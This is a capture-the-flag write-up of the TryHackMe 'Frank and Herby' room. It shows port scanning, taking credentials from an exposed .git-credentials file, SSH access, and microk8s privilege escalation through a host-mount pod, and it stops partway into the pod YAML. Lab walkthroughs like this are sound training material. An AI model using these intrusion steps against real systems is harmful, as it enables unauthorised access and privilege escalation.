![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/8ae37fba-f0bd-490d-93f8-1a89547cf24b)

https://tryhackme.com/room/frankandherby

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

I initiated the enumeration process by conducting a port and service scan using rustscan:

```bash
sudo rustscan -a 10.10.99.202 -- -sC -sV -vv -oN frank_nmap
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/10e99c49-aaa1-420a-9ee0-d5be9ab0e13a)

```Rust
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 64:79:10:0d:72:67:23:80:4a:1a:35:8e:0b:ec:a1:89 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVZVdzBeNozVqMBvkqTgoMzE1gZdDq9qQo80NRBAbAuwgemIowsSpVnbn98CQIoxjAQ/zbyqu05qDnosP2MVXSwpgFr+D6Wk6nkB2pWSzCwdHsBuNxNkU3RNv9dPb4S1wUNlMOpGhEpyNo50zslBnQN7kz7ZPRHET37+q1aySu2WU9UlvRdsN6ouqoQyH06UGFza0X21wPKmhwG4IjxtSbG0ST5Gi3TBUNs3r4LlmvcY0OgCCpAwjCxjl8V2a/FB/SH9Tg6a3fc815tWaN028nbXMHOvyBW+kW3ETvp5pR+IGBHGXIs0zJhJV/FZSBVRkLF5p53LDrq0eCL+b2yjVLl5keOZPJU2T6encsjkMZB3ynJLqYuojIDYSDzvBVdZFQNFNKIVd67o8yX/J27PusXiXBmVwkk/ZfXaEqzURkDg4car1cV5WOJIRIHxz9V+TZ/OC10er/iBppNrzjmpCJXzzey21OoTpLZ3GyEL2s+07TPxHb3HOwupQKZ1y2i4c=
|   256 3b:0e:e7:e9:a5:1a:e4:c5:c7:88:0d:fe:ee:ac:95:65 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNX+QRguEL4oz+kogQzTSjnw/avVHwIvCK4QwTJmettBooLnWqE3JafmjtuKXJiGKe+8f0v6wYbLnwM2fy4EcSo=
|   256 d8:a7:16:75:a7:1b:26:5c:a9:2e:3f:ac:c0:ed:da:5c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM5D29NgPRAP6UHvWfviHmkXUvTGAk9r2c+JcknWvle7
3000/tcp  open  ppp?        syn-ack ttl 61
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: sameorigin
|     Content-Security-Policy: default-src 'self' ; connect-src *; font-src 'self' data:; frame-src *; img-src * data:; media-src * data:; script-src 'self' 'unsafe-eval' ; style-src 'self' 'unsafe-inline' 
|     X-Instance-ID: e9FzmxdSoPQFAMj3m
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Wed, 29 Nov 2023 10:36:04 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/a3e89fa2bdd3f98d52e474085bb1d61f99c0684d.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: sameorigin
|     Content-Security-Policy: default-src 'self' ; connect-src *; font-src 'self' data:; frame-src *; img-src * data:; media-src * data:; script-src 'self' 'unsafe-eval' ; style-src 'self' 'unsafe-inline' 
|     X-Instance-ID: e9FzmxdSoPQFAMj3m
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Wed, 29 Nov 2023 10:36:05 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/a3e89fa2bdd3f98d52e474085bb1d61f99c0684d.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|_    <meta name="distribution" content
10250/tcp open  ssl/http    syn-ack ttl 61 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=dev-01@1633275132
| Subject Alternative Name: DNS:dev-01
| Issuer: commonName=dev-01-ca@1633275132
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-03T14:32:12
| Not valid after:  2022-10-03T14:32:12
| MD5:   dd8a 17b6 22ea 587b 2621 a781 be04 1abb
| SHA-1: 0056 04ff 40cd 599b dba5 5284 3212 5b60 eba1 c1a2
| -----BEGIN CERTIFICATE-----
| MIIDHzCCAgegAwIBAgIBAjANBgkqhkiG9w0BAQsFADAfMR0wGwYDVQQDDBRkZXYt
| MDEtY2FAMTYzMzI3NTEzMjAeFw0yMTEwMDMxNDMyMTJaFw0yMjEwMDMxNDMyMTJa
| MBwxGjAYBgNVBAMMEWRldi0wMUAxNjMzMjc1MTMyMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEAyLRjjp3bYIA9SlX3jvQEA0qGXoktj0NyTLHt0mu95Af2
| 8pTxlWFCHNsAO7NxfWMR+JQB4ye/0D+t5G+JtRufQjO43FY0BLO0X7CK2WYYn7I6
| jEcDNbt4oP8mWywDmLgup8Tv8ShwhmKPi5grodOrjPisGFfR6RRwChkShoGfHNdj
| Eq3WQTpf7igUvBGsFXlpZ62EvvOwwlPle38SQXW0YhXWLSa59j/hCLz+YgfzKT7Y
| Gbzrhxsr/Yp/uiPG5j9NvMrBGTgQcjQI7PSCX2LH/+pPJTTWcbJuPrBTXNCyyvID
| Jq17E86dUoVx+HToCJwCLlLDTFvdblATLQWo78vaYQIDAQABo2kwZzAOBgNVHQ8B
| Af8EBAMCBaAwEwYDVR0lBAwwCgYIKwYBBQUHAwEwDAYDVR0TAQH/BAIwADAfBgNV
| HSMEGDAWgBRipuTO9+j4esDmwlsc9wjGEW3UOTARBgNVHREECjAIggZkZXYtMDEw
| DQYJKoZIhvcNAQELBQADggEBAIyY65CvWE787Dn5By8+XwMJwJc8wtIglcWLuian
| u+M6aqloikoURmKlT1+gN1n8MnfpyuVPKEbgXWppOKzKkAGNGn4ptNJUHcaSonvj
| qloY4cMnEYu+DRv80R2madzUA6mQpjmFQmn3oo7YlGI+lvMU7umCkdrcToMSu8WN
| rK9uWzPknZwuBKlPdZFEKOTlXKNBToRzwiUTsBcgB8SItnY9OtGelw79DZOMvbZG
| GjKjbUhLvZ5MoyRSnQIDs64Rn9bDfe9wO430UpchdvLEPdxx5DmJpYeETXWUtPLJ
| ECzUEpoPalavNxuafA9B/KKDHltXq67csvggD0zvjTmTkbo=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10255/tcp open  http        syn-ack ttl 61 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10257/tcp open  ssl/unknown syn-ack ttl 61
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Wed, 29 Nov 2023 10:36:14 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Wed, 29 Nov 2023 10:36:15 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| ssl-cert: Subject: commonName=localhost@1701251624
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Issuer: commonName=localhost-ca@1701251610
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-29T08:53:17
| Not valid after:  2024-11-28T08:53:17
| MD5:   3170 2402 6743 e4c3 1660 7470 59dc 1b16
| SHA-1: 76d9 18dd 77d1 28fa 4cbf eb80 b2aa 2856 ae31 50f8
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAiGgAwIBAgIBAjANBgkqhkiG9w0BAQsFADAiMSAwHgYDVQQDDBdsb2Nh
| bGhvc3QtY2FAMTcwMTI1MTYxMDAeFw0yMzExMjkwODUzMTdaFw0yNDExMjgwODUz
| MTdaMB8xHTAbBgNVBAMMFGxvY2FsaG9zdEAxNzAxMjUxNjI0MIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3yPktNAiQW2Pvx86VC8DNL8GeS5qgPgqTqM6
| Nv8x91xyEHnO5QUcKa+AAyeSvGeeE2YX83VZQmgMEC4bG7mpKgrQqWooCNBemfwZ
| v/ulo0TRdFBRudDkIaMtXb8ojdYsQX0DLheyld4eFpXv2IBOzAf9w42Lrk1vQgEP
| qdfZxpNHiTu2Jj2u+Kg66wJm6iQjwTpIN84oS/9y6WeuYsB8bsyZH92CZKkWesYH
| sH9VQlyG4TV486L2JvBD3JE2g17jKvYDqNg72n6dqLYuSsIrMeW3J+A2u6tbJL25
| cprtxWt3JYRDw3ZEXL1ZrUwQA7VJLVFfvbOTpLgWgsSPnKvObQIDAQABo30wezAO
| BgNVHQ8BAf8EBAMCBaAwEwYDVR0lBAwwCgYIKwYBBQUHAwEwDAYDVR0TAQH/BAIw
| ADAfBgNVHSMEGDAWgBQvj2J0NYgP3PZ5OKtMQwd5TylhzjAlBgNVHREEHjAcggls
| b2NhbGhvc3SCCWxvY2FsaG9zdIcEfwAAATANBgkqhkiG9w0BAQsFAAOCAQEAGcbV
| 93C6i1NAE9YWDUg0eUvNTEx+43lkLf20ofOtmGtNzuROWWPjVQ5CHTsDCthOGcNw
| z+ET4Jh3AmPCL68j6vhxVeXxwA0FYQvHCRukEJh29QIOz1i1D31W6ExlXyU+memH
| lcEJlQX13Y+wYcZsfp+EN1vkMlYTLwSeIhqHXRkGRCf6FHVSdArZZH/TL/TNegAo
| gutx6an/shUtm82EsZd5VTZVgcNDCHbYz6h5MKhfozhAJK1ICNFqhkCyBBnVqQxy
| gnEn8831+QCaLaZ6zY6Y8/9fHGHEXk22DjvbgcI8Fe6x/U1Qgk72Qv5VlylFcSB/
| A9JT3Iwd1lKJ0iNhLA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10259/tcp open  ssl/unknown syn-ack ttl 61
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Wed, 29 Nov 2023 10:36:14 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Wed, 29 Nov 2023 10:36:15 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| ssl-cert: Subject: commonName=localhost@1701251629
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Issuer: commonName=localhost-ca@1701251610
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-29T08:53:16
| Not valid after:  2024-11-28T08:53:16
| MD5:   964d 6c2f 0c0b 6aa1 d42f 836b a495 5e95
| SHA-1: 70ed e24a 0267 9c9e 5180 05e3 9e09 8788 b470 4219
| -----BEGIN CERTIFICATE-----
| MIIDOTCCAiGgAwIBAgIBAjANBgkqhkiG9w0BAQsFADAiMSAwHgYDVQQDDBdsb2Nh
| bGhvc3QtY2FAMTcwMTI1MTYxMDAeFw0yMzExMjkwODUzMTZaFw0yNDExMjgwODUz
| MTZaMB8xHTAbBgNVBAMMFGxvY2FsaG9zdEAxNzAxMjUxNjI5MIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAugaS8HHq5AB2IOWdaY/s+1wCCbnRsnkZbP2X
| mMjGzcPiiMgwiAAsNPZhCgYO8CK1aapfLdE0f4trt7jxONM+x7bOZYDRvHk170Xc
| z3IgvuyWlYOC6IpzsVpTpwBe1Ckql7p5dEB3iVCIUgl1t+mB3HI5yUjoAVPAPSHQ
| IYhOnC6hPZXMkv6cW8K+cjEXFIEFgdR7bByxka6wVUFOJhK2SYcyRABw5Yyx9CqN
| FPMZhLLA9P7WkIdVuUUhjRJNH1CkGqVTPa/5vqFdm14RDONqfwxOBGYiWtDrGYHz
| +q9kfoujScVH9EaG7glpML1ELLM9hRZrd2GXSua2FCWyvPB1KQIDAQABo30wezAO
| BgNVHQ8BAf8EBAMCBaAwEwYDVR0lBAwwCgYIKwYBBQUHAwEwDAYDVR0TAQH/BAIw
| ADAfBgNVHSMEGDAWgBTwxOGOWUxniJAFDSNNdha+WUFL2TAlBgNVHREEHjAcggls
| b2NhbGhvc3SCCWxvY2FsaG9zdIcEfwAAATANBgkqhkiG9w0BAQsFAAOCAQEACoxo
| uww14YSve8rmnaLZ1yeO3HqS/aaQeBTL/Gf+4YZOf+TV5uinXfhCD+FGMcSswBBH
| +kyz5skTqQ356LatB6QNKbVBbKKjGW1WPpmCxBUMnqixNdwNSVtpVwUqGsOYRqla
| 8bQDBJVPSEkNG7qGMA0HXsx0jGwXZX8ih+7dR2nGm2u8M5SEF4F3Rb8TF9wyIHRJ
| AMMI2AlHceB9uHmD8Pf1QaH6ZtomHDUo3lyMpnB2oJ9+IWaQjCHpOICJa94tygeY
| skAe3Lk35fuO3TtuNTY4uWYbeUFRu4lrCVABI+Qap5vtqq7CiIz7tIYaSzDGtQNP
| 5GxlW6qb8UDjFXYVzQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
16443/tcp open  ssl/unknown syn-ack ttl 61
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Wed, 29 Nov 2023 10:36:51 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Wed, 29 Nov 2023 10:36:14 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Wed, 29 Nov 2023 10:36:15 GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB/localityName=Canonical/organizationalUnitName=Canonical
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.99.202, IP Address:172.17.0.1
| Issuer: commonName=10.152.183.1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-29T09:52:31
| Not valid after:  2024-11-28T09:52:31
| MD5:   8f46 a33f cfef 48bf d7a5 b01c 3b8e a643
| SHA-1: 2873 c904 b0cb f940 f8a7 d370 ede1 0d42 5049 b366
| -----BEGIN CERTIFICATE-----
| MIIESzCCAzOgAwIBAgIUJSPnnYOyhWVx9FjkEmMl3eXdVqkwDQYJKoZIhvcNAQEL
| BQAwFzEVMBMGA1UEAwwMMTAuMTUyLjE4My4xMB4XDTIzMTEyOTA5NTIzMVoXDTI0
| MTEyODA5NTIzMVowcTELMAkGA1UEBhMCR0IxEjAQBgNVBAgMCUNhbm9uaWNhbDES
| MBAGA1UEBwwJQ2Fub25pY2FsMRIwEAYDVQQKDAlDYW5vbmljYWwxEjAQBgNVBAsM
| CUNhbm9uaWNhbDESMBAGA1UEAwwJMTI3LjAuMC4xMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEAuERN+hndVUHIpLPiRzMKVACFoIzmnC67K9iLXkAIPg1q
| e8CvVEjV+r0N/DIArwoH/nBLcYvYRNa0xFG1OXWpayf2FkuqArUW2WGBNTZOiPw9
| zZsrDBT7K4ssFY0V0KCIgEH39AspDIrkKRtpfu24q/OP8UYb2Xt1qeI0AUyoUYMo
| 5/NNpAgGCSdHIa6yEO4Og+xlb9JxKZ0tGvhZ1u8CfhrE0s+OJKJB1HXfsjos0Npg
| 9Gwjne7mvouKbokT6+GAuJGVZ4AZbPu6PFcl771afIyDD1Fk5RE8qz+qDS5tUZqH
| phKj4PY08UFhj1+Z0r8JxhBOdIzL3Yi3vBJ/GCcDTwIDAQABo4IBMzCCAS8wUgYD
| VR0jBEswSYAUH+SBan2m9jU0CVKgCGLsV6Xb5tyhG6QZMBcxFTATBgNVBAMMDDEw
| LjE1Mi4xODMuMYIUItSnhhe8LpqTg+PJi/1G2u5vPHUwCQYDVR0TBAIwADALBgNV
| HQ8EBAMCBLAwHQYDVR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMIGhBgNVHREE
| gZkwgZaCCmt1YmVybmV0ZXOCEmt1YmVybmV0ZXMuZGVmYXVsdIIWa3ViZXJuZXRl
| cy5kZWZhdWx0LnN2Y4Iea3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVygiRr
| dWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWyHBH8AAAGHBAqYtwGH
| BAoKY8qHBKwRAAEwDQYJKoZIhvcNAQELBQADggEBAKZQKFht5nk74cmgQzCP5Dfv
| NXqewQnHP5cRkbB5nqjFlG5+1d9ig8LTqO7ILnrRh4Fq5d8Dfm7H2Owxn7uzQ+XA
| jF6hJBgT1ss2dGZLl2So2GIRbKfcOwwsFDsfO7Fa5Ejq19FR0fqkBkjrWtYM2bEN
| JZsvvnH1TvaZ5OAKABdAyKStaJrfgiaUDoZM4+9BVGAbIRv4t+FF5BP5TsQ+DeSa
| Ic+57L3JwKHh2O5Nw+V2hzdDLZqXL85yJATBg9HVHpMlAHN+C9Mpv5tqvIscV2al
| 2O3WP/2+eytcK7pGwBSCCd101qU5naeeKKakjRv/B6DW/9/yrSlVI1g7w56+qYw=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
25000/tcp open  ssl/http    syn-ack ttl 61 Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB/localityName=Canonical/organizationalUnitName=Canonical
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.99.202, IP Address:172.17.0.1
| Issuer: commonName=10.152.183.1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-29T09:52:31
| Not valid after:  2024-11-28T09:52:31
| MD5:   8f46 a33f cfef 48bf d7a5 b01c 3b8e a643
| SHA-1: 2873 c904 b0cb f940 f8a7 d370 ede1 0d42 5049 b366
| -----BEGIN CERTIFICATE-----
| MIIESzCCAzOgAwIBAgIUJSPnnYOyhWVx9FjkEmMl3eXdVqkwDQYJKoZIhvcNAQEL
| BQAwFzEVMBMGA1UEAwwMMTAuMTUyLjE4My4xMB4XDTIzMTEyOTA5NTIzMVoXDTI0
| MTEyODA5NTIzMVowcTELMAkGA1UEBhMCR0IxEjAQBgNVBAgMCUNhbm9uaWNhbDES
| MBAGA1UEBwwJQ2Fub25pY2FsMRIwEAYDVQQKDAlDYW5vbmljYWwxEjAQBgNVBAsM
| CUNhbm9uaWNhbDESMBAGA1UEAwwJMTI3LjAuMC4xMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEAuERN+hndVUHIpLPiRzMKVACFoIzmnC67K9iLXkAIPg1q
| e8CvVEjV+r0N/DIArwoH/nBLcYvYRNa0xFG1OXWpayf2FkuqArUW2WGBNTZOiPw9
| zZsrDBT7K4ssFY0V0KCIgEH39AspDIrkKRtpfu24q/OP8UYb2Xt1qeI0AUyoUYMo
| 5/NNpAgGCSdHIa6yEO4Og+xlb9JxKZ0tGvhZ1u8CfhrE0s+OJKJB1HXfsjos0Npg
| 9Gwjne7mvouKbokT6+GAuJGVZ4AZbPu6PFcl771afIyDD1Fk5RE8qz+qDS5tUZqH
| phKj4PY08UFhj1+Z0r8JxhBOdIzL3Yi3vBJ/GCcDTwIDAQABo4IBMzCCAS8wUgYD
| VR0jBEswSYAUH+SBan2m9jU0CVKgCGLsV6Xb5tyhG6QZMBcxFTATBgNVBAMMDDEw
| LjE1Mi4xODMuMYIUItSnhhe8LpqTg+PJi/1G2u5vPHUwCQYDVR0TBAIwADALBgNV
| HQ8EBAMCBLAwHQYDVR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMIGhBgNVHREE
| gZkwgZaCCmt1YmVybmV0ZXOCEmt1YmVybmV0ZXMuZGVmYXVsdIIWa3ViZXJuZXRl
| cy5kZWZhdWx0LnN2Y4Iea3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVygiRr
| dWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWyHBH8AAAGHBAqYtwGH
| BAoKY8qHBKwRAAEwDQYJKoZIhvcNAQELBQADggEBAKZQKFht5nk74cmgQzCP5Dfv
| NXqewQnHP5cRkbB5nqjFlG5+1d9ig8LTqO7ILnrRh4Fq5d8Dfm7H2Owxn7uzQ+XA
| jF6hJBgT1ss2dGZLl2So2GIRbKfcOwwsFDsfO7Fa5Ejq19FR0fqkBkjrWtYM2bEN
| JZsvvnH1TvaZ5OAKABdAyKStaJrfgiaUDoZM4+9BVGAbIRv4t+FF5BP5TsQ+DeSa
| Ic+57L3JwKHh2O5Nw+V2hzdDLZqXL85yJATBg9HVHpMlAHN+C9Mpv5tqvIscV2al
| 2O3WP/2+eytcK7pGwBSCCd101qU5naeeKKakjRv/B6DW/9/yrSlVI1g7w56+qYw=
|_-----END CERTIFICATE-----
31337/tcp open  http        syn-ack ttl 60 nginx 1.21.3
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.21.3
|_http-title: Heroic Features - Start Bootstrap Template
32000/tcp open  http        syn-ack ttl 60 Docker Registry (API: 2.0)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title.
```

Subsequently, I systematically investigated the open ports one by one:

  - Port 3000:
    There is a Rocket chat application running.
    
    ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/6f010c35-ccac-4b46-9ae9-cc9066882063)

  - Port 10250:
    
    ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/c1510af6-f038-4f78-a4f6-d44f7b636bcb)

  - Port 10255:
    
    ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/8831d514-2dab-4d9a-9ccf-7a0680ccdf9c)

  - Port 10257:
    
    ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/1ff5f30a-82b1-443a-9658-e5b922ae604e)

  - Port 10259:
    
    ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/bc32bc2c-0f29-4382-b040-ad6108b283d3)

  - Port 16443:
    
    ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/f9b4aaf4-a05b-4e3b-b476-37d2c3bba341)

  - Port 31337:
    
    ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/0db2561c-ea7c-430d-852a-1218cf15770d)

  - Port 32000: Blank page.
    
    ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/5506146e-7107-4fb1-b5e1-f3ffc20a648b)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Web enumeration:

Continuing with the web enumeration, I explored ports 3000 and 31337. On port 3000, I encountered a Rocket Chat application:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/12957566-8f1f-4f9a-bfb2-72c84511e552)

Meanwhile, on port 31337, several sub-directories caught my attention:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/621d0c5a-44d2-48c4-8e2b-9424c848431f)

Among these results, a particularly interesting directory stood out: ".git-credentials".

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access:

Upon discovering the ".git-credentials" directory, I found a file containing Frank's credentials in urlencoded format:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/01f292f7-90b4-4430-b212-337656c231d4)

Decoding the credentials, I attempted to log in via SSH using the Frank account. Successfully authenticating with these credentials, I gained initial access and secured the user flag in Frank's home directory. (pwnn3d!🙂)

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/121711c7-a864-47ae-b551-b9e64d6dee84)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privilege Escalation:

To attain the root flag, I needed to escalate my current privileges. I began my enumeration by checking Frank's sudo privileges, but it revealed that Frank does not have any sudo privileges assigned:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/d2059fa1-2734-491c-b47a-f156ccb2d2c4)

Further investigation into scheduled tasks on the host indicated that there were no running tasks.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/4b0c3bb5-62de-46d8-a6d3-09db0417c80a)

Since linpeas wasn't executed, and considering that root is typically found within Kubernetes, I followed the hint provided on the THM page:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/de600f14-2dbe-4e4a-b1f7-150d01b4ce5b)

Following the hint, I used a tool called "[kube-hunter](https://github.com/aquasecurity/kube-hunter)" to remotely scan the target. The scan revealed potential Kubernetes vulnerabilities:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/be2daac3-5eb5-4668-9f14-196a85c66efa)
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/ecc32e80-ed24-42f0-a918-6160577adb04)

Upon confirming that I could escalate my privileges on a vulnerable container, and considering that Frank is in the microk8s group, I searched for microK8s privilege escalation. I found a blog post by [PulseSecurity](https://pulsesecurity.co.nz/advisories/microk8s-privilege-escalation) and began examining microK8s:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/f4534f2d-dd90-4f31-b21a-83251bafe2f4)

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/faf154b5-cc96-407e-a15b-4f4d13a85871)

I noticed a pod named "kubectl," and upon further investigation, I found that it was running the nginx-deployment pod inside it:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/eb1cbcd8-f090-4251-83cf-f40abe68ba14)

Checking the pod details using the command below revealed details about the image and image ID:

```bash
microk8s.kubectl get pods nginx-deployment-7b548976fd-77v4r -o yaml
```

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/0e1d1ef7-afe7-49a5-a883-5b78a021331d)
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/c17c6b6c-b09a-413b-b370-4c635c5b736d)

Now, armed with the image name and ID, I created a malicious pod according to the PoC and obtained the root shell. The yaml file for creating the pod looked like this after modifying the pod name:

```yaml
apiVersion: v1                                                                                                                                                                                                                             
kind: Pod                                                                                                                                                                                                                                  
metadata:                                                                                                                                                                                                                                  
  name: hostmount                                                                                                                                                                                                                          
spec:                                                                                                                                                                                                                                      
